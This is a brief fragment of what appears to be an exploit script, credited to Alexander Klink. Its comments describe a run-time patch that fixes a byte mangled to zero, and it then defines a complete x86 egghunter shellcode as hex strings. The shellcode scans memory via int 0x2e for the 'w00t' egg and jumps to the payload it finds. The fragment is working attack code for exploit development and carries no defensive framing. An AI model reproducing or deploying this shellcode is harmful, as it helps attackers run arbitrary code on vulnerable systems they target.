# @alech - Alexander Klink
# the \x2e in the egghunter turns into 0, so we manually fix it
# up beforehand, with the following code
#
# MOV EBX, ESP           # 8B DC
# ADD EBX, 20            # 83C3 20 # now points to the param of int, 0
# MOV BYTE PTR [EBX], B8 # C603 B8 # we move 0x2e * 4 there
# SHR BYTE PTR [EBX], 2  # C02B 02 # and divide by 4

egghunter =  "\x8b\xdc\x83\xc3\x20\xc6\x03\xb8\xc0\x2b\x02"
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
